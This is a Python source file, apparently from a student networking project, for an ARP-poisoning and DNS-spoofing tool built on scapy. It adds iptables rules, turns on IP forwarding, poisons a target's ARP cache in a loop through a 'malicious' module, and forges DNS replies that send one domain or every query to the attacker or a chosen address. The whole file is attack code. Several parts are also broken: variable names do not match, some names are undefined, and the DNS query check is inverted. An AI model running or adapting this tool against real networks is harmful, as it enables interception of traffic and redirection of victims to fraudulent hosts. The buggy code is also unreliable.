#/*********************************************************************************************
#       Name:	dnsspoof.py
#
#       Developer:	Mat Siwoski/Shane Spoor
#
#       Created On: 2017-10-24
#
#       Description:
#
#
#    Revisions:
#    (none)
#
###################################################################################################


#!/usr/bin/env python

from __future__ import print_function
from scapy.all import *

import argparse
import functools
import malicious
import os
import reader
import signal
import socket
import sys
import threading

targetIPAddress = "192.168.0.7"
hostIPAddress = "192.168.0.8"

#########################################################################################################
# FUNCTION
#
#   Name:		parseArguments
#
#   Prototype:	def parseArguments
#
#   Developer:	Mat Siwoski/Shane Spoor
#
#   Created On: 2017-10-24
#
#   Parameters:
#
#   Return Values:
#	
#   Description:
#   This function is for handling the arguments when running the application.
#   There are 6 options in total to choose from.
#       -d - The domain that can be spoofed.
#       -i - The host IP
#       -t - The Target IP.
#       -r - Optional argument. You can choose to redirect the IP or default to the attacker IP.
#       -a - Spoof every dns request back to the attacker.
#       -h - Help menu.
#
#   Revisions:
#	(none)
#    
#########################################################################################################
def parseArguments():
    parser = argparse.ArgumentParser()

    parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d milliways.bcit.ca")
    parser.add_argument("-i", "--hostIP", help="Choose the host IP. Example: -i 192.168.0.8", default=hostIPAddress)
    parser.add_argument("-t", "--targetIP", help="Choose the target IP. Example: -t 192.168.0.8", default=targetIPAddress)
    parser.add_argument("-r", "--redirect", help="Optional. Choose the redirect IP or otherwise default to attacker IP. Requires -d or -a. Example: -r 192.168.0.8")
    parser.add_argument("-a", "--all", help="Spoof every DNS request back to the attacker or use optional argument -r to specify an IP to redirect to.", action="store_true")
    return parser.parse_args()

def nfQueueCallback(arguments, nfpkt):
    data = nfpacket.get_payload()
    pkt = IP(data)
    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    if IP in pkt:
        if pkt.haslayer(DNS):
            dns = pkt.getlayer(DNS)
            pkt_time = pkt.sprintf('%sent.time%')

            if not pkt.haslayer(DNSQR):
                qr = pkt.getlayer(DNSQR) # DNS query
                qtype_field = qr.get_field('qtype')
                qclass_field = qr.get_field('qclass')
                values = [ pkt_time, str(ip_src), str(ip_dst), str(dns.id), str(qr.qname), str(qtype_field.i2repr(qr, qr.qtype)), str(qclass_field.i2repr(qr, qr.qclass))]

                nfpacket.accept()
            else:
                if arguments.all:
                    if not arguments.redirect:
                        malicious.spoofed_pkt(nfpkt, pkt, localIP)
                    else:
                        malicious.spoofed_pkt(nfpkt, pkt, arg_parser().redirectto)
                if arguments.domain:
                    if arguments.domain in pkt[DNS].qd.qname:
                        if not arguments.redirect:
                            malicious.spoofed_pkt(nfpkt, pkt, localIP)
                        else:
                            malicious.spoofed_pkt(nfpkt, pkt, arguments.redirectto)
            
            print("|".join(values))

#########################################################################################################
# FUNCTION
#
#   Name:		getMACAddress
#
#   Prototype:	def getMACAddress(ipAddress)
#
#   Developer:	Mat Siwoski/Shane Spoor
#
#   Created On: 2017-10-24
#
#   Parameters: 
#   ipAddress - IP Address to get the MAC Address for
#
#   Return Values:
#	
#   Description:
#   This function uses the Scapy library to get the MAC address of the IP address given.
#
#   Revisions:
#	(none)
#    
#########################################################################################################
def getMACAddress(ipAddress):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipAddress), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src


#########################################################################################################
# FUNCTION
#
#   Name:		main
#
#   Prototype:	def main(arguments)
#
#   Developer:	Mat Siwoski/Shane Spoor
#
#   Created On: 2017-10-24
#
#   Parameters:
#   arguments - the arguments from the argument sparser
#
#   Return Values:
#	
#   Description:
#   This function is the main function of the program.
#
#   Revisions:
#	(none)
#    
#########################################################################################################
def main(arguments):

    global targetMACAddress, hostMACAddress
    
    #test so that the user is running as root
    #required as we will be altering the iptables
    if os.geteuid() != 0:
        print("[!] [!] [!] Run this program as root [!] [!] [!]")

    #Explanation on iptables
    #PREROUTING: the chain will catch packets before they're given routing rules 
    #so it can catch all packets from the target machine
    os.system('iptables -t nat -A PREROUTING -p udp --dport 8000 -j  NFQUEUE --queue-num 1') 
    
    ipForward = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipForwardReadContents = ipForward.read()
    if ipForwardReadContents != '1\n':
        ipForward.write('1\n')
    ipForward.close()

    # Find the hardware address associated with the host IP, if any
    try:
        hostAddrPacked = inet_pton(socket.AF_INET, arguments.hostIP)
    except Exception as err:
        sys.exit("Host IP {} is invalid. Please enter a valid IPv4 address.".format(arguments.hostIP))
    hostMACAddress = next( (get_if_hwaddr(ifname) for ifname in get_if_list() if get_if_raw_addr(ifname) == hostAddrPacked), None)
    if not hostMACAddress:
        sys.exit("No MAC Address for Host. Exiting program")        

    # Send ARP request to find the target MAC
    targetMACAddress = getMACAddress(arguments.targetIP)
    if targetMACAddress == None:
        sys.exit("No MAC Address for Target. Exiting program")
    else:
        print("Host MAC Address: ", hostMACAddress)
        print("Target MAC Address: ", targetMACAddress)

    # Create a new thread to poison the host's ARP cache, then read and respond to their DNS queries
    runEvent = threading.Event()
    runEvent.set()

    def poisonThreadFunc():
        while runEvent.is_set():
            malicious.ARPPoisonVictim(arguments.hostIP, arguments.targetIP, hostMACAddress, targetMACAddress)
            time.sleep(1.5)

    poisonThread = threading.Thread(target=poisonThreadFunc)
    poisonThread.start()

    def exitCallback():
        runEvent.clear()
        poisonThread.join()

    # The reader will handle keyboard interrupts and call exitCallback
    r = reader.Reader(functools.partial(nfQueueCallback, arguments), exitCallback)
    r.run()

if __name__ == "__main__":
    main(parseArguments())

